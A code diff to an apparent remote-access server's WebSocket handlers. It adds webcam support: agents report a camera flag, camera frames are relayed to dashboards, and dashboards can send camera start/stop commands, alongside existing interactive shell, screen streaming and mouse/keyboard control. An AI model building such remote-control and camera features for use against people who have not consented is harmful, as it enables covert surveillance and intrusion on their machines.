@@ -19,7 +19,8 @@ async def ws_agent(ws: WebSocket):
         agent_id = info.get('agent_id') or 'unknown-agent'
         agent_name = info.get('agent_name') or agent_id
         http_base = info.get('http_base') or 'http://localhost:8000'
-        await manager.register_agent(agent_id, agent_name, http_base, ws)
+        has_camera = bool(info.get('has_camera'))
+        await manager.register_agent(agent_id, agent_name, http_base, ws, has_camera)
 
         # Stream messages from agent to dashboards
         while True:
@@ -45,6 +46,9 @@ async def ws_agent(ws: WebSocket):
             elif data.get('type') == 'screen_frame':
                 frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                 await manager.relay_screen_to_dashboards(agent_id, frame)
+            elif data.get('type') == 'camera_frame':
+                frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
+                await manager.relay_camera_to_dashboards(agent_id, frame)
             elif 'error' in data:
                 await manager.relay_output_to_dashboards(agent_id, str(data['error']))
             else:
@@ -83,7 +87,8 @@ async def ws_dashboard(ws: WebSocket):
                     await ws.send_json({"type": "error", "message": f"Agent {target} not available"})
             elif target and data.get('type') in (
                 'start_interactive','stdin','end_interactive',
-                'screen_start','screen_stop','mouse','keyboard'
+                'screen_start','screen_stop','mouse','keyboard',
+                'camera_start','camera_stop'
             ):
                 ok = await manager.forward_json(target, data)
                 if not ok:
